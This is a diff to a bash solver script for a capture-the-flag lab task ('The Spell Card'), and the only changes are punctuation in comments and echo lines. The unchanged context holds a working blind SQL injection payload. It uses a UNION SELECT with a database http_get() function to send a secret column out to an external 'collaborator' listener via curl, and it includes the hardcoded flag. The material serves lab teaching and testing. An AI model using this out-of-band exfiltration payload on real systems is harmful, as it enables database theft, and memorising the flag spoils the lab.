@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# solvers/p3_1.sh — Task 3.1 "The Spell Card" canonical exploit.
+# solvers/p3_1.sh, Task 3.1 "The Spell Card" canonical exploit.
 #
 # This floor's own HTTP response is fully blind: /p3/spellcard always renders
 # the same "the card was cast into the field" text regardless of what the
@@ -9,7 +9,7 @@
 # The OOB primitive: the MariaDB image ships with a custom http_get() UDF
 # (udf/http_get.c, compiled by mariadb/Dockerfile, registered in the seed
 # SQL).  Calling it from an injected UNION SELECT causes *MariaDB's own
-# process* to originate a real outbound HTTP GET to whatever URL is passed —
+# process* to originate a real outbound HTTP GET to whatever URL is passed,
 # the application layer is completely uninvolved.  The canonical listener
 # on the lab's internal network is the `collaborator` service.
 #
@@ -33,14 +33,14 @@ FLAG="SEIYAKU{word_left_the_island}"
 
 PAYLOAD="nonexistent' UNION SELECT http_get(CONCAT('http://collaborator/spellcard-cast/', secret)) FROM sealed_cards-- -"
 
-echo "[p3_1] GET ${BASE}/p3/spellcard — fully-blind OOB injection via http_get() UDF"
+echo "[p3_1] GET ${BASE}/p3/spellcard, fully-blind OOB injection via http_get() UDF"
 echo "[p3_1] payload: card=${PAYLOAD}"
 
 resp=$(curl -s -G "${BASE}/p3/spellcard" --data-urlencode "card=${PAYLOAD}")
 
 # The response must NOT contain the flag.
 if echo "$resp" | grep -qF "$FLAG"; then
-    echo "[p3_1] WARNING: flag appeared in the in-band HTTP response — blind property broken"
+    echo "[p3_1] WARNING: flag appeared in the in-band HTTP response, blind property broken"
 fi
 
 echo "[p3_1] polling ${BASE}/p3/spellcard/captures for the OOB confirmation..."
